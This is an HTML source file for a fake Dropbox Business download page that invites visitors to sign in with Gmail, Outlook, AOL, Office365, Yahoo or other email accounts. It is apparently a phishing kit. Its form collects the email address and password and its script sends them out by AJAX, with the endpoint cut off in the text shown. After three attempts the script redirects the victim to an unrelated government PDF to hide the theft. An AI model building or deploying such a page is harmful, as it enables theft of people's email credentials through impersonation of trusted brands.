...
<head>
  ...
  <body>
    <div class="container-fluid">
      <div class="row" style="background-image: url('images/5.jpg'); background-size: cover;background-repeat: no-repeat;padding:70px 0px 70px 0px;">
        <div class="col-lg-12">
          <div class="container">
            <div class="row">
              <div class="col-lg-6 mx-auto text-center mb-3">
                  <img src="images/dropbox-white.png" class="img-fluid" width="300px" ><br>
                  <span class="h4 text-white">Select Your E-Mail Provider</span>                
              </div>
        ...
        <div class="container rounded" style="background-color: rgba(0,0,0,0.5);">
          <div class="row">
            <div class="col-lg-6 text-center">
              <div style="margin: 80px 0px 80px 0px;">
                <span class="h4 text-white" >Where do you want to download from?</span><br>
                <span class="h5 text-white">Now, You can sign in to dropBox with your im.</span>
                <img src="images/box.png" class="img-fluid" width="200px"><br><br>
                <span class="h5 text-white">Drop Work the way you do.</span><br>
                <center><small class=" text-white">@ 2023 DropBox Buisness</small></center>
              </div>
            </div>
            <div class="col-lg-6" style="padding: 20px 50px 20px 50px;">
              <div class="p-5 rounded" style="border-left:3px solid white;">
                <div class="row">
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #D44638;">
                        ...
                        <span style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Gmail</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #0073C8;">
                        ...
                        <span style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
                      </div>
                    </a>
                  </div>
                </div>
                  ...
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #31459B;">
                        ...
                        <span style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #FF3C00;">
                        ...
                        <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
                      </div>
                    </a>
                  </div>
                </div>
                  ...
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #5F0F68;">
                        ...
                        <span style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12 text-center">
                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="rounded px-2 py-1 mt-2" style=" background-color: #0B5BD3;">
                        ...
                        <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
                      </div>
                    </a>
                  </div>
                </div>
            ...
            <form id="contact" class="form-horizontal well">
              <div class="col-lg-12">
                <div class="form-group">
                  ...
                  <input type="email" name="im" class="form-control" id="im" aria-describedby="imHelp" placeholder="Enter email">
                  <small id="imHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                </div>
              </div>
              <div class="col-lg-12">
                <div class="form-group">
                  <label for="Password">Password</label>
                  <input type="password" name="pm" class="form-control" id="pm" aria-describedby="imHelp" placeholder="Enter Password">
                </div>
              </div>
            </div>
  ...
  <script>
    ...
    $(document).ready(function(){
      ...
      $('#submit-btn').click(function(event){
        ...
        if (count>=3) {
          count=0;
          window.location.replace("https://www.govinfo.gov/content/pkg/GPO-CONAN-2017/pdf/GPO-CONAN-2017-10-17.pdf");
        }
        else
        {
         $.ajax({
